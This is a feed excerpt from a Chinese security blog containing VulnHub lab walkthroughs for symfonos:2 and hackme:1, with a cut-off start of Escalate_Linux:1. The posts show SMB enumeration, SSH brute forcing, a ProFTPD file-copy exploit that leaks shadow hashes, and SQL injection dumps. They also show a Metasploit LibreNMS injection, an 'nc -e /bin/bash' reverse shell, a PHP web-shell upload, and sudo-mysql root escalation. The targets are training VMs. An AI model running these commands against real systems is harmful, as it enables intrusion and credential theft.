      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对symfonos:2的测试</title>
    <link href="http://www.lanbainan.cn/2019/08/03/2019-08-03/"/>
    <id>http://www.lanbainan.cn/2019/08/03/2019-08-03/</id>
    <published>2019-08-03T00:11:00.000Z</published>
    <updated>2019-08-03T12:30:54.940Z</updated>
    
    <content type="html"><![CDATA[<h1 id="symfonos-2"><a href="#symfonos-2" class="headerlink" title="symfonos:2"></a>symfonos:2</h1><p>主机桥接模式<br>实验目的：获取root<br>项目地址：<a href="https://www.vulnhub.com/entry/symfonos-2,331/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/symfonos-2,331/</a><br><a id="more"></a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://i.loli.net/2019/08/03/QB3iyI5aCAVdS82.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p- 192.168.31.221</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         ProFTPD 1.3.5</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)</span><br><span class="line">|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)</span><br><span class="line">|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)</span><br><span class="line">80/tcp  open  http        WebFS httpd 1.21</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-server-header: webfs/1.21</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 08:00:27:B5:39:C4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.029 days (since Sat Aug  3 01:30:34 2019)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=260 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s</span><br><span class="line">| nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   SYMFONOS2&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   SYMFONOS2&lt;03&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   SYMFONOS2&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.5.16-Debian)</span><br><span class="line">|   Computer name: symfonos2</span><br><span class="line">|   NetBIOS computer name: SYMFONOS2\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: symfonos2</span><br><span class="line">|_  System time: 2019-08-03T01:12:00-05:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2019-08-03 02:12:00</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure></p><p>ftp不允许匿名登录<br>80端口没有枚举出信息</p><h3 id="Enum4linux"><a href="#Enum4linux" class="headerlink" title="Enum4linux"></a>Enum4linux</h3><p>利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息（引用宛老师的话）<br>概况来说：Enum4linux是一个用于枚举Windows和Samba信息的工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# enum4linux -a 192.168.31.221</span><br><span class="line">WARNING: The &quot;syslog&quot; option is deprecated</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        anonymous       Disk</span><br><span class="line">        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)</span><br></pre></td></tr></table></figure></p><p>找到一个共享文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# smbclient //192.168.31.221/anonymou</span><br><span class="line">Enter WORKGROUP\root&apos;s password: #空密码</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">smb: \&gt; cd backups</span><br><span class="line">smb: \&gt; get log.txt</span><br></pre></td></tr></table></figure></p><h2 id="枚举密码"><a href="#枚举密码" class="headerlink" title="枚举密码"></a>枚举密码</h2><p>得到一个用户<code>aeolus</code>,22端口可以枚举<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l aeolus -P /usr/share/wordlists/rockyou.txt 192.168.31.221 ssh</span><br></pre></td></tr></table></figure></p><p>但是相对时间太长了，看见<code>ProFTPD 1.3.5</code>，相信也可以利用一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit ProFTPD 1.3.5</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/03/uJDyPXQrAKS35GU.png" alt="2.png"><br>此信息与上述漏洞一起使用将<code>shadow</code>放在<code>/home/aeolus/share/backups</code><br><img src="https://i.loli.net/2019/08/03/Xyjbf68kDMYoxG5.png" alt="3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7::</span><br><span class="line">aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::</span><br><span class="line">cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::</span><br></pre></td></tr></table></figure></p><p>进行爆破<code>aeolus:sergioteamo</code></p><h2 id="aeolus持续深入"><a href="#aeolus持续深入" class="headerlink" title="aeolus持续深入"></a>aeolus持续深入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">λ ssh aeolus@192.168.31.221</span><br><span class="line">aeolus@symfonos2:~$ id</span><br><span class="line">uid=1000(aeolus) gid=1000(aeolus) groups=1000(aeolus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br></pre></td></tr></table></figure><p><code>netstat</code>无法使用，惊喜的发现<code>Nmap</code>可以用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">aeolus@symfonos2:~$ nmap -T4 -A -v -p- 127.0.0.1</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">3306/tcp open  mysql       MySQL 5.5.5-10.1.38-MariaDB-0+deb9u1</span><br><span class="line">| mysql-info:</span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.1.38-MariaDB-0+deb9u1</span><br><span class="line">|   Thread ID: 15</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">8080/tcp open  http        Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: B8211E9B75068FB852BFB155D9A1A2EE</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://localhost/login</span><br></pre></td></tr></table></figure></p><p><code>mysql</code>不慌先，8080端口运行着新的http服务，但是是本机运行，将它转发出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aeolus@symfonos2:~$ socat -d TCP-LISTEN:1234,fork,reuseaddr tcp:127.0.0.1:8080</span><br></pre></td></tr></table></figure></p><p>效果图<br><img src="https://i.loli.net/2019/08/03/TC2UHO1wWuikPtr.png" alt="4.png"></p><h2 id="利用libreNMS"><a href="#利用libreNMS" class="headerlink" title="利用libreNMS"></a>利用libreNMS</h2><p>这个端口上运行着<code>libreNMS</code><br><img src="https://i.loli.net/2019/08/03/sGcumdZwzvV9ypE.png" alt="5.png"><br>俩都可以用<br>这里使用msf加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/http/librenms_addhost_cmd_inject</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; show options</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set rhosts 192.168.31.221</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set rport 1234</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set lhost 192.168.31.30</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set username aeolus</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set password sergioteamo</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; exploit</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">cronus@symfonos2:/opt/librenms/html$ id</span><br><span class="line">uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)</span><br></pre></td></tr></table></figure></p><p>不是很会用msf，再次反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.31.35 7777</span><br><span class="line">λ nc -nvlp 7777</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">cronus@symfonos2:/opt/librenms/html$ id</span><br><span class="line">uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)</span><br></pre></td></tr></table></figure></p><h2 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a><a href="https://gtfobins.github.io/gtfobins/mysql/" target="_blank" rel="noopener">mysql提权</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cronus@symfonos2:/home/cronus$ sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/03/iV8lbkCNXRIhSos.png" alt="6.png"><br>能root权限运行<code>mysql</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cronus@symfonos2:/home/cronus$ sudo -u root mysql -e &apos;\! /bin/sh&apos;</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><h2 id="可爱的flag"><a href="#可爱的flag" class="headerlink" title="可爱的flag"></a>可爱的flag</h2><p><img src="https://i.loli.net/2019/08/03/iRdrxASKWfMFpgQ.png" alt="7.png"></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;symfonos-2&quot;&gt;&lt;a href=&quot;#symfonos-2&quot; class=&quot;headerlink&quot; title=&quot;symfonos:2&quot;&gt;&lt;/a&gt;symfonos:2&lt;/h1&gt;&lt;p&gt;主机桥接模式&lt;br&gt;实验目的：获取root&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/symfonos-2,331/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/symfonos-2,331/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对hackme:1的测试</title>
    <link href="http://www.lanbainan.cn/2019/07/29/2019-07-29/"/>
    <id>http://www.lanbainan.cn/2019/07/29/2019-07-29/</id>
    <published>2019-07-29T14:59:00.000Z</published>
    <updated>2019-07-31T15:14:18.641Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hackme：1"><a href="#Hackme：1" class="headerlink" title="Hackme：1"></a>Hackme：1</h1><p>主机NET模式<br>实验目的：获取root<br>项目地址：<a href="https://www.vulnhub.com/entry/hackme-1,330/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/hackme-1,330/</a><br><a id="more"></a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/29/5d3ea7426413f70528.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p- 192.168.67.150</span><br><span class="line">PORT   STATE SERVICE VERSION                                                     </span><br><span class="line">22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:                                                                   </span><br><span class="line">|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad (RSA)                   </span><br><span class="line">|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 (ECDSA)                  </span><br><span class="line">|_  256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 (ED25519)                </span><br><span class="line">80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))                              </span><br><span class="line">| http-methods:                                                                  </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS                                     </span><br><span class="line">|_http-server-header: Apache/2.4.34 (Ubuntu)                                     </span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br></pre></td></tr></table></figure></p><p>80端口<br><img src="https://i.loli.net/2019/07/29/5d3ea822206d346381.png" alt="2.png"></p><h2 id="枚举文件"><a href="#枚举文件" class="headerlink" title="枚举文件"></a>枚举文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowerca se.txt -s 200 -x .php,.html -u http://192.168.67.150</span><br><span class="line">/config.php (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/register.php (Status: 200)</span><br><span class="line">/login.php (Status: 200)</span><br><span class="line">/. (Status: 200)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/29/5d3eaaa4e61b254641.png" alt="3.png"><br>注册后登陆<br><img src="https://i.loli.net/2019/07/29/5d3eaf4949d7a13913.png" alt="4.png"><br>第一印象POST注入<br>burp保存请求包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /welcome.php HTTP/1.1</span><br><span class="line">Host: 192.168.67.150</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.67.150/welcome.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: PHPSESSID=hgo3gtefqfhp41degdpiunnckc</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">search=%27</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# sqlmap -r passwd -D webapphacking -T users --dump</span><br><span class="line">+----+--------------+------------+---------------------------------------------+----------------+</span><br><span class="line">| id | name         | user       | pasword                                     | address</span><br><span class="line">|</span><br><span class="line">+----+--------------+------------+---------------------------------------------+----------------+</span><br><span class="line">| 1  | David        | user1      | 5d41402abc4b2a76b9719d911017c592 (hello)    | Newton Circles |</span><br><span class="line">| 2  | Beckham      | user2      | 6269c4f71a55b24bad0f0267d9be5508 (commando) | Kensington</span><br><span class="line">|</span><br><span class="line">| 3  | anonymous    | user3      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) | anonymous</span><br><span class="line">|</span><br><span class="line">| 10 | testismyname | test       | 05a671c66aefea124cc08b76ea6d30bb (testtest) | testaddress</span><br><span class="line">|</span><br><span class="line">| 11 | superadmin   | superadmin | 2386acb2cf356944177746fc92523983            | superadmin</span><br><span class="line">|</span><br><span class="line">| 12 | test1        | test1      | 05a671c66aefea124cc08b76ea6d30bb (testtest) | test1</span><br><span class="line">|</span><br><span class="line">| 13 | EV           | lanbai     | e10adc3949ba59abbe56e057f20f883e (123456)   | TEST</span><br><span class="line">|</span><br><span class="line">+----+--------------+------------+---------------------------------------------+----------------+</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/29/5d3eb6f799f7c72091.png" alt="5.png"><br><code>superadmin:Uncrackable</code><br><img src="https://i.loli.net/2019/07/29/5d3eb908891e655487.png" alt="6.png"></p><h2 id="上传Webshell"><a href="#上传Webshell" class="headerlink" title="上传Webshell"></a>上传Webshell</h2><p>上传Webshell，修改IP和端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure></p><p>无过滤，直接上传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.67.150/uploads/php-reverse-shell.php</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">λ nc -nvlp 1234</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">www-data@hackme:/$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>从<code>/home/legacy</code>发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr--r-x 1 root root 8472 Mar 26 04:38 touchmenot</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@hackme:/home/legacy$ ./touchmenot</span><br><span class="line">./touchmenot</span><br><span class="line">root@hackme:/home/legacy# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Hackme：1&quot;&gt;&lt;a href=&quot;#Hackme：1&quot; class=&quot;headerlink&quot; title=&quot;Hackme：1&quot;&gt;&lt;/a&gt;Hackme：1&lt;/h1&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：获取root&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/hackme-1,330/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/hackme-1,330/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对Escalate_Linux:1的测试</title>
    <link href="http://www.lanbainan.cn/2019/07/24/2019-07-24/"/>
    <id>http://www.lanbainan.cn/2019/07/24/2019-07-24/</id>
    <published>2019-07-24T14:18:00.000Z</published>
    <updated>2019-07-26T01:49:40.623Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Escalate-Linux-1"><a href="#Escalate-Linux-1" class="headerlink" title="Escalate_Linux:1"></a>Escalate_Linux:1</h1><p>主机NET模式<br>实验目的：学习Linux提权新操作（12种操作）<br>项目地址：<a href="https://www.vulnhub.com/entry/escalate_linux-1,323/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/escalate_linux-1,323/</a><br>在家休整发现，<code>vulnhub</code>更新好多有趣的挑战。<br><a id="more"></a> </p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/23/5d3719b2abf7610461.png" alt="1.png"></p><h2 id="nmap开始"><a href="#nmap开始" class="headerlink" title="nmap开始"></a>nmap开始</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p- 192.168.67.148</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: OPTIONS HEAD GET POST</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">111/tcp   open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100003  3           2049/udp  nfs</span><br><span class="line">|   100003  3,4         2049/tcp  nfs</span><br><span class="line">|   100005  1,2,3      33880/udp  